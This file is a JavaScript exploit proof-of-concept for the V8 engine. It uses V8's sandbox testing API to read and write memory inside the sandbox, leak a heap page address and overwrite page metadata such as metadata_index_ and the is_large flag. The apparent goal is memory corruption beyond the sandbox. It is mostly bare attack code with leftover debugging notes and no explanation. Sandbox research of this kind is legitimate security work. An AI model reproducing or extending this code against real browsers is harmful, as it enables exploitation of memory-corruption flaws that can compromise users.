

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
  return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
  return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
  return sandboxMemory.setBigInt64(Number(addr), val, true);
}

function sr_heap_base() {
  let buf = new ArrayBuffer(8);
  let u8arr = new Uint8Array(buf);
  return addrOf(u8arr);
}

let buf = new ArrayBuffer(8);
let u8arr = new Uint8Array(buf);

// search heap_base
// let ofs_u8arr = 0x40;
// let leak_addr = v8_read64(ofs_u8arr);

// console.log("addr[", ofs_u8arr.toString(16), "] = ", leak_addr.toString(16));
// addr[ 494a8 ] =  7250028380d


// heap_base
let ofs1 = 0x48;
let leak_addr = v8_read64(ofs1);
let low_ofs_started_page = leak_addr & 0xffffffffn;
let high_ofs_started_page = leak_addr & 0xffffffff00000000n;
let ofs_store_page_metadata_pointer = high_ofs_started_page + 0x48n;
console.log("addr[0x" + ofs_store_page_metadata_pointer.toString(16) + "] = 0x" + leak_addr.toString(16));
console.log("low_ofs_started_page = " + low_ofs_started_page.toString(16));
console.log("[low_ofs_started_page]: = " + v8_read64(low_ofs_started_page).toString(16));
console.log("before writing to addr: 0x"+ leak_addr.toString(16));
// 0x35b200000048

gc();
gc();
gc();
// %SystemBreak();

// v8_write64(low_ofs_started_page+0x40n, 0x0101010102020202n);
// console.log("after writing +0x40");
// v8_write64(low_ofs_started_page+0x30n, 0x0303030304040404n);
// console.log("after writing +0x30");
// v8_write64(low_ofs_started_page+0x20n, 0x0505050506060606n);
// console.log("after writing +0x20");
// v8_write64(low_ofs_started_page+0x10n, 0x0707070708080808n);
// console.log("after writing +0x10");

v8_write64(low_ofs_started_page+8n, 0x0101010100000000n + 0x7fffn); // overwrite metadata_index_ 0x4444n
console.log("overwrite metadata_index_")

v8_write64(low_ofs_started_page+0x10n, 0x0101010102020202n);
v8_write64(low_ofs_started_page+0x18n, 0x0303030304040404n);
v8_write64(low_ofs_started_page+0x20n, 0x0505050506060606n);
v8_write64(low_ofs_started_page+0x28n, 0x0707070708080808n);
v8_write64(low_ofs_started_page+0x30n, 0x090909090a0a0a0an);
v8_write64(low_ofs_started_page+0x38n, 0x0b0b0b0b0c0c0c0cn);
v8_write64(low_ofs_started_page+0x40n, 0x0d0d0d0d0e0e0e0en);

v8_write64(low_ofs_started_page, 0x4141414142020000n); // disable flag is_large (0x200)
console.log("after writing +0x0");
console.log("after writing to addr: 0x"+ leak_addr.toString(16));


// %SystemBreak();
// Write to the page starting at 0x3c032d4c0000 
// addr[ 48 ] =  291e00040000

// %DebugPrint(u8arr);


// v8_write64(addrOf(u8arr)+4, 0x414141414141n);
// %SystemBreak();

